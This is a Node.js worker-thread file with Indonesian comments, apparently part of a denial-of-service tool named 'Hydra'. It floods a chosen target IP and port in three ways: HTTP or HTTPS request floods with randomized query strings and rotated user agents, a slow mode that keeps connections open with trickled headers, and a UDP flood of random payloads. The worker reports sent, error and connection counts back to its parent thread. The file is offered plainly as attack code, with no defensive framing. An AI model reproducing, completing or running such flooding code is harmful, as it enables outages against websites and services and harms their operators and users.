// File: worker.js
const { parentPort, workerData } = require('worker_threads');
const net = require('net');
const tls = require('tls'); // Untuk koneksi HTTPS
const crypto = require('crypto');
const dgram = require('dgram'); // Diperlukan untuk UDP

// Mengakses workerData di level teratas worker
const { targetIP, port, attackType, mode, durationMs, httpMethod, workerId } = workerData;

// --- Konfigurasi Tambahan ---
const USER_AGENTS = [ // Daftar user agent yang sama (perlu diisi ulang jika Anda belum)
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
];
const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

// --- Statistik Worker ---
let sentRequests = 0;
let activeConnections = 0; // Ini adalah jumlah koneksi yang dikelola worker ini
let errors = 0;
let serverErrors = 0;
let durationTimer = null; // Timer untuk durasi serangan

// --- Helper Functions ---
function getRandomBigInt(max) {
    try {
        const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
        const num = buffer.readUIntBE(0, buffer.length);
        return num % max;
    } catch (e) {
        return Math.floor(Math.random() * max); // Fallback
    }
}

function generateRandomString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += CHARSET[getRandomBigInt(CHARSET.length)];
    }
    return result;
}

function getRandomUserAgent() {
    if (USER_AGENTS.length === 0) return 'HydraWorkerClient';
    return USER_AGENTS[getRandomBigInt(USER_AGENTS.length)];
}

function parseHTTPStatus(responseData) {
    if (!responseData || responseData.length === 0) return ["", "No Response Data"];
    const responseStr = responseData.toString();
    if (responseStr.includes("HTTP/")) {
        const lines = responseStr.split('\r\n');
        if (lines.length > 0) {
            const statusLine = lines[0];
            const parts = statusLine.split(' ');
            if (parts.length >= 2) return [parts[1], statusLine];
        }
    }
    return ["", "Non-HTTP Response"];
}

// --- Logika Serangan HTTP ---
async function httpAttack(socket, target, method, mode) {
    const startTime = Date.now();
    const requestQueue = [];
    let lastWriteTime = Date.now(); // Diperlukan untuk mode slow
    
    // Initial request queue population
    for (let i = 0; i < 100; i++) { requestQueue.push(generateRandomString(10)); }

    // Timer untuk durasi serangan
    if (durationMs !== null) {
        durationTimer = setTimeout(() => {
            // console.log(`Worker ${workerId}: Attack duration reached. Closing connection.`);
            socket.end(); // Menutup koneksi untuk mengakhiri loop
        }, durationMs);
    }

    // Fungsi loop utama untuk mengirim request
    const attackLoop = async () => {
        if (socket.destroyed) return; // Jika socket sudah tidak valid

        let requestIdentifier = requestQueue.shift() || generateRandomString(10); // Ambil dari antrian atau buat baru
        
        let request = `${method} /?${requestIdentifier} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nConnection: keep-alive\r\n`;

        if (mode === 'slow') {
             request = `${method} /?${requestIdentifier} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nAccept: */*\r\nAccept-Encoding: identity\r\nConnection: keep-alive\r\n`;
        }

        try {
            socket.write(request);
            sentRequests++;
            activeConnections = 1; // Worker ini punya 1 koneksi aktif

            if (mode === 'slow') {
                 const slowData = `X-Hydra-KeepAlive: ${generateRandomString(15)}\r\n`;
                 socket.write(slowData);
            }
            lastWriteTime = Date.now();

            // Menangani data yang diterima
            socket.once('data', (data) => {
                const [status, _] = parseHTTPStatus(data);
                if (status && (status.startsWith('4') || status.startsWith('5'))) {
                    serverErrors++;
                    parentPort.postMessage({ type: 'stats', serverErrors: 1 });
                }
                if (mode === 'normal') {
                    // console.log(`Worker ${workerId}: Received response (normal mode), closing connection.`);
                    socket.end(); // Tutup setelah respon di mode normal
                }
            });

            socket.setTimeout(3000); // Timeout baca 3 detik

            // Tambahkan request baru ke antrian untuk menjaga loop tetap berjalan
            requestQueue.push(generateRandomString(10));

        } catch (error) {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            socket.end(); // Tutup koneksi jika ada error tulis
        }
        
        // Jadwalkan loop berikutnya
        setTimeout(attackLoop, 1 + Math.floor(Math.random() * 4));
    };

    // Mulai loop serangan
    attackLoop();
}

// Placeholder untuk serangan UDP
async function udpAttack(socket, target, port) {
    const startTime = Date.now();
    while (true) {
        if (durationMs !== null && (Date.now() - startTime > durationMs)) break;

        try {
            const payload = Buffer.from(generateRandomString(500 + Math.floor(Math.random() * 500)));
            socket.send(payload, port, target);
            sentRequests++;
            parentPort.postMessage({ type: 'stats', sent: 1 });
            await new Promise(res => setTimeout(res, 10)); // Delay kecil
        } catch (error) {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            break; 
        }
    }
}

// --- Fungsi Utama Worker ---
async function runWorker() {
    let socket = null;
    let isConnectionSuccessful = false;

    try {
        // PERBAIKAN: Gunakan variabel 'port' dan 'attackType' yang sudah di-scope dari workerData
        if (port === 443 || attackType === 'https') { // Pastikan 'port' dan 'attackType' diakses di sini
            // Gunakan TLS untuk HTTPS (port 443 defaultnya adalah HTTPS)
            const options = {
                host: targetIP,
                port: port,
                timeout: 5000 // Timeout koneksi 5 detik
            };
            socket = tls.connect(options);
        } else if (attackType === 'http') {
            // Koneksi HTTP biasa
            const options = {
                host: targetIP,
                port: port,
                timeout: 5000 // Timeout koneksi 5 detik
            };
            socket = net.connect(options);
        } else if (attackType === 'udp') {
            const socket = dgram.createSocket('udp4');
            
            socket.on('error', (err) => {
                errors++;
                parentPort.postMessage({ type: 'stats', errors: 1 });
                socket.close();
            });

            socket.on('message', (msg, rinfo) => {
                serverErrors++;
                parentPort.postMessage({ type: 'stats', serverErrors: 1 });
            });

            activeConnections = 1; 
            parentPort.postMessage({ type: 'stats', active: activeConnections });
            await udpAttack(socket, targetIP, port); // Panggil fungsi UDP
            socket.close();
            return; // Keluar setelah UDP selesai
        } else {
            throw new Error(`Unsupported attack type: ${attackType}`);
        }

        // Handler untuk koneksi TCP/TLS
        socket.on('connect', () => {
            isConnectionSuccessful = true;
            activeConnections = 1;
            parentPort.postMessage({ type: 'stats', active: activeConnections });
            httpAttack(socket, targetIP, httpMethod, mode);
        });

        socket.on('timeout', () => {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            socket.end();
        });

        socket.on('close', (hadError) => {
            activeConnections = 0;
            parentPort.postMessage({ type: 'stats', active: activeConnections });
            clearTimeout(durationTimer); // Pastikan timer durasi dibersihkan
        });

        // Handler untuk error pada socket
        socket.on('error', (err) => {
            errors++;
            parentPort.postMessage({ type: 'stats', errors: 1 });
            // console.error(`Worker ${workerId}: Socket error:`, err.message);
            socket.end(); // Tutup jika ada error
        });

    } catch (error) {
        errors++;
        parentPort.postMessage({ type: 'stats', errors: 1 });
        console.error(`Worker ${workerId}: Global error in worker:`, error.message);
    } finally {
        if (socket) socket.end(); // Pastikan socket tertutup
        clearTimeout(durationTimer); // Pastikan timer durasi dibersihkan
        parentPort.postMessage({ type: 'done', workerId: workerId });
    }
}

// --- Jalankan Worker ---
runWorker();
